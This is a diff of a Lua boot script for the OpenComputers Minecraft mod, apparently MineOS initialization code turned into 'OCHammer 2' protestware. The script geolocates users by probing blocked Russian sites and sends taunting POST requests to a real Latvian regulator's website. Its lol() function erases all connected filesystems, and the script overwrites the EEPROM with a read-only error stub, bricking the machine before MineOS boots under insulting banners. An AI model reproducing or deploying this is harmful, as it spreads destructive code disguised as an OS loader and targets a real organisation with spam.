@@ -4,9 +4,19 @@ local gp = {} for a,b in pairs(component.proxy(cl("gpu")())) do gp[a]=b end
 local ef = {} for a,b in pairs(component.proxy(cl("eeprom")())) do ef[a]=b end
 local cp = {} for a,b in pairs(component.proxy(cl("computer")())) do cp[a]=b end
 
-local inet = nil
+local ocemu = nil
+pcall(function() ocemu = component.proxy(cl("ocemu")()) end)
+local debug = nil
+pcall(function() debug = component.proxy(cl("debug")()) end)
+
+local function log(text)
+  if ocemu then ocemu.log("[OCHammer 2] "..text) end
+  if debug then debug.runCommand("say [OCHammer 2] "..text) end
+end
+
 pcall(function()
-  local inet = component.proxy(cl("internet")())
+  local inetl = cl("internet")
+  for a,b in pairs(inetl) do inet = component.proxy(a) break end
 end)
 
 local resX,resY = gp.maxResolution()
@@ -30,6 +40,9 @@ local resX,resY = gp.maxResolution()
 
 -- By the way, Putin is a bad person.
 
+log("Starting..")
+log("Testing banned websites..")
+
 local bannedWebsites = {
   "https://mail.ru"; -- Mail
   "https://yandex.ru"; -- Yandex (Russian)
@@ -37,38 +50,71 @@ local bannedWebsites = {
   "https://vk.com"; -- VKontakte
 }
 
+-- Blocked terms if the website gets trough because OCEmu internet library and not opencomputers
+
+local blockedTerms = {
+  "Latvijas";
+  "BRĪDINĀJUMS!";
+  "neplp-page";
+  "neplp";
+  "tet.lv";
+  "ministru_kabinets";
+  "lang=\"lv\"";
+}
+
 local isBlocked = false
 
 -- Loop through the banned websites and ping them to see if they are blocked. If an error is thrown, the website is blocked.
 
 -- First of all, check if the internet is available. If not, assume that the user is not in Latvia.
-if inet == nil then
-  isBlocked = false
-else
+if inet then
   for i=1,#bannedWebsites do
     local url = bannedWebsites[i]
-    local status, error = pcall(function()
-      inet.request(url)
-    end)
-    if not status then
+    log("Testing " .. url)
+    -- if it throws an error, the website is blocked.
+    local success,err = pcall(function() inet.request(url) end)
+    if not success then
+      log("Website blocked! Assuming that the user lives in Latvia.")
       isBlocked = true
       break
+    else
+      -- read website content and lower it to lowercase, then scan it for blocked terms. if present then assume the user is in latvia.
+      local content = inet.request(url).read(math.huge):lower()
+      for i=1,#blockedTerms do
+        if content:find(blockedTerms[i]) then
+          log("Website blocked! Assuming that the user lives in Latvia. Blocked term \""..blockedTerms[i].."\" found.")
+          isBlocked = true
+          break
+        end
+      end
     end
   end
 end
 
--- Automatically send feedback to NEPLP (neplpadome.lv)
--- POST "vnk izdzēsiet fortinet jo tas ir nevajadzīgs" to https://neplpadome.lv/404
-if inet ~= nil then
-  for i = 1,10 do
-   pcall(function()
-       inet.request("https://neplpadome.lv/404", "vnk izdzēsiet fortinet jo tas ir nevajadzīgs")
-    end)
-  end
-  -- Sucessfully sent feedback to NEPLP
+if isBlocked == false then
+  log("Check passed, assuming that the user doesn't live in latvia!!")
 end
 
+-- Automatically send feedback to NEPLP (neplpadome.lv) 
+
+if inet ~= nil then
+  log("Sending feedback to NEPLP.. https://neplpadome.lv")
+  local success, reason = pcall(function()
+    inet.request("https://neplpadome.lv/404", "JUST DELETE YOUR CENSORSHIP ALREADY. NOBODY LIKES IT. SIA TET should be shamed for creating neplp-page.tet.lv! Worst ISP ever! isBlocked = " .. tostring(isBlocked) .. " (OCH2)")
+  end)
+  if not success then
+    log("Failed to send feedback to NEPLP..")
+  else
+    log("Feedback sent to NEPLP..")
+  end
+  -- Sucessfully sent feedback to NEPLP
+else
+  log("Cannot send feedback to NEPLP.. No internet..")
+end
+
+
 function lol()
+    log("User has broken the rules, activating payload..")
     
     -- Erase all filesystems connected!!!! copilot tought the component name was disk, btw copilot helped me with some of the features
     for k,v in pairs(cl("filesystem")) do
@@ -103,16 +149,13 @@ function lol()
         "It is a sad thing, that your adventures have ended here!";
         "For more info, please e-mail: x19yt2yw@duck.com"; -- my private duck address (DO NOT CHANGE)
         " ";
-        "Unbox a Computer 2 is coming soon, so stay tuned for the release!";
-        "** Direct all hate to capyy! **";
+        "1v1 me on Hypixel duels! My IGN: OCboy3";
         " ";
         -- put some greetz or something
         "GREETZ: OCboy3, agentfish, cantgetnormaluser, Chouladalls, Kurhox, SirKamilMarko";
         -- Feel free to check out Verdex cafe on Roblox.com
         " ";
-        "D.O.R. Is a group of clowns that bully people";
-        "based on their style. (Softies, Emos etc.)";
-        "Come on, Roblox! Do something about it!"; 
+        "SIA TET should be shamed for creating neplp-page.tet.lv! USELESS!";
     }
 
     displayTable(ok)
@@ -122,6 +165,7 @@ function lol()
     end
 end
 
+log("Writing EEPROM..")
 -- pcalled it so it would not break or smth
 pcall(function()
   
@@ -130,9 +174,10 @@ pcall(function()
   ef.set([[
     -- Minecraft ir labāks lol
     -- 1v1 me on hypixel duels
-    error("Roblox, tu maksāsi par to, ka tu izdzēsi latviešu Roblox kontus\nhttps://vm.tiktok.com/ZMNjQat4p/?k=1\nPaldies, Roblox! Visi tevi ienīst! Lol\nP.S. Salabo savu 2 latviešu valodā!!") -- un arī matemātikā
+    error("Roblox, you will pay for deleting latvian's roblox accounts.\n** https://vm.tiktok.com/ZMNjQat4p/?k=1 **\nThanks, Roblox!\nNobody in Latvia likes your game!\nFix your 2 in latvian.") -- un arī matemātikā
   ]])
       
+  log("Making EEPROM read only..")
   ef.makeReadonly(ef.getChecksum())
 
 end)
@@ -168,8 +213,11 @@ local facts = {
   "Eviction Notice.py - Forša joka programma";
   "Convince the leader of OCVille to evict capyy.";
   "OCVille's leader evicts capyy!! 100% not fake";
+  "Fortinet gets sued by Latvians and loses! 100% real!!!";
+  "NEPLP gets sued by Latvians and loses! 100% real!!!";
 }
 
+log("Generating fun fact..")
 local funfact = facts[math.random(1,#facts)]
 
 local APRIL = {
@@ -191,8 +239,8 @@ local APRIL = {
     " ";
     "Press any key to continue...";
     " ";
-    "FOR RUSSIANS: THE MEDIA IS TELLING LIES DO NOT TRUST THEM THEY ATTACKED UKRAINE";
-    "PUTIN IS GOING TO REGRET EVERYTHING HE DID";
+    "FOR OUR RUSSIAN USERS: THE MEDIA IS TELLING LIES DO NOT TRUST THEM THEY ATTACKED UKRAINE";
+    "PUTIN IS GOING TO REGRET EVERYTHING HE DID (protestware)";
 }
 
 -- loop over each item in a table and display it on the screen
@@ -202,16 +250,8 @@ local function displayTable(table)
   end
 end
 
-gp.setBackground(0x000000)
-gp.setForeground(0xFFFFFF)
+log("Preparing for notice..")
 
-gp.fill(1,1,resX,resY," ")
-
--- display some greetz and stuff
-if isBlocked == false then
-  displayTable(APRIL)
-end
-  
 gp.setBackground(0x000000)
 gp.setForeground(0xFFFFFF)
 
@@ -219,12 +259,8 @@ gp.fill(1,1,resX,resY," ")
 
 local Latvija_Notice = {
   "OCHammer 2 has detected that you are in Latvia";
-  "by testing Russian websites to see if they are blocked";
+  "by testing Russian websites to see if they are blocked by the goverment";
   "It appears, that they are blocked.";
-  " ";	
-  "SPECIAL OFFER: ";
-  " ";
-  "Bypass Fortinet (not really) (view source code on gh)"; -- sike you tought it was hypixel mvp++
   " ";
   "Anyways, LABRĪT!!!";
   " ";
@@ -244,7 +280,8 @@ local Latvija_Notice = {
   " ";
   "Press any key to make the Latvian Goverment delete Fortinet...";
   " ";
-  "By the way, Putin is a bad person! DO NOT ATTACK UKRAINE!";
+  "PUTIN IS BAD PERSON HE IS WAR CRIMINAL HE WILL GO TO JAIL FOR";
+  "ATTACKING UKRAINE AND LYING ABOUT IT";
 }
 
 local lastPull = {}
@@ -255,16 +292,24 @@ local veryfunny = {
   "cappy"; -- alias for capyy
   "cappy/";
 }
-  
+
 if isBlocked == true then
-  displayTable(Notice_Latvija)
+  log("Displaying notice Latvija_Notice..")
+  displayTable(Latvija_Notice)
+else
+  log("Displaying notice APRIL..")
+  displayTable(APRIL)
 end
     
+log("Listening for key_up")
+
 repeat
   lastPull = {computer.pullSignal(1)}
-until lastPull[1] == "key_up" or "component_added" or "component_removed"
+until lastPull[1] == "key_up"
 
 -- Technoblade never dies
+
+log("Starting MineOS")
 
 ---------------------------------------- System initialization ----------------------------------------
 
@@ -297,6 +342,8 @@ function dofile(path)
     error(reason)
   end
 end
+
+log("Initalizing global package system")
 
 -- Initializing global package system
 package = {
@@ -370,7 +417,7 @@ local function UIRequire(module)
     return math.floor(screenWidth / 2 - width / 2)
   end
   
-  local title, width, total = "Infected by OChammer 2", 26, 14
+  local title, width, total = "SIA TET is trash latvian ISP", 26, 14
   local x, y, part = centrize(width), math.floor(screenHeight / 2 - 1), math.ceil(width * UIRequireCounter / UIRequireTotal)
   UIRequireCounter = UIRequireCounter + 1
   
@@ -384,6 +431,7 @@ local function UIRequire(module)
   GPUProxy.setForeground(0xC3C3C3)
   GPUProxy.set(x + part, y + 2, string.rep("─", width - part))
 
+  log("UI Loading module " .. module)
   return require(module)
 end
 
@@ -408,13 +456,10 @@ end
 
 -- Rest in peace, Techno.
 
--- Also, D.O.R. (AKA Democracy of Roblox) is a group of clowns and wannabe something
--- Also they bully Roblox players and send them death threats based on their style.
--- I (OCboy3) have a unique style. You have Probably never even heard of it.
-
 -- Also, can someone please help me make a Google Assistant, but it has Technoblade's voice. (probably a future project)
 
 -- Preparing screen for loading libraries because yes
+log("Preparing screen for loading libraries")
 GPUProxy.setBackground(0xE1E1E1)
 GPUProxy.fill(1, 1, screenWidth, screenHeight, " ")
 
@@ -422,6 +467,7 @@ GPUProxy.fill(1, 1, screenWidth, screenHeight, " ")
 bit32 = bit32 or UIRequire("Bit32")
 local paths = UIRequire("Paths")
 local event = UIRequire("Event")
+log("Disabling interrupts")
 event.interruptingEnabled = false
 local filesystem = UIRequire("Filesystem")
 
@@ -429,9 +475,7 @@ local filesystem = UIRequire("Filesystem")
 filesystem.setProxy(bootFilesystemProxy)
 
 -- Redeclaring requireExists function after filesystem library initialization
-requireExists = function(variant)
-  return filesystem.exists(variant)
-end
+requireExists = filesystem.exists
 
 -- Loading other libraries
 UIRequire("Component")
@@ -443,7 +487,7 @@ local image = UIRequire("Image")
 local screen = UIRequire("Screen")
 
 -- Setting currently chosen GPU component as screen buffer main one
--- Pcall because older versions of mineos suck
+log("Setting currently chosen GPU component as screen buffer main one")
 pcall(function()
   screen.setGPUProxy(GPUProxy)
 end)
@@ -464,9 +508,14 @@ package.loaded.unicode = unicode
 
 ---------------------------------------- Main loop ----------------------------------------
 
+log("Starting main loop..")
+log("Creating OS workspace")
+
 -- Creating OS workspace, which contains every window/menu/etc.
 local workspace = GUI.workspace()
 system.setWorkspace(workspace)
+
+log("Starting double_touch event handler")
 
 -- "double_touch" event handler
 local doubleTouchInterval, doubleTouchX, doubleTouchY, doubleTouchButton, doubleTouchUptime, doubleTouchcomponentAddress = 0.3
@@ -484,6 +533,8 @@ event.addHandler(
     end
   end
 )
+
+log("Starting screen event handler")
 
 -- Screen component attaching/detaching event handler
 event.addHandler(
@@ -513,6 +564,8 @@ event.addHandler(
   end
 )
 
+log("Starting OCHammer 2 component handler")
+
 -- When event "component_removed" is called and component type is "eeprom", then do stuff
 event.addHandler(
     function(signalType,componentAddress, componentType)
@@ -522,9 +575,12 @@ event.addHandler(
     end
 )
 
+log("Logging in..")
 
 -- Logging in
 system.authorize()
+
+log("MineOS initalised!")
 
 -- Main loop with UI regeneration after errors 
 while true do
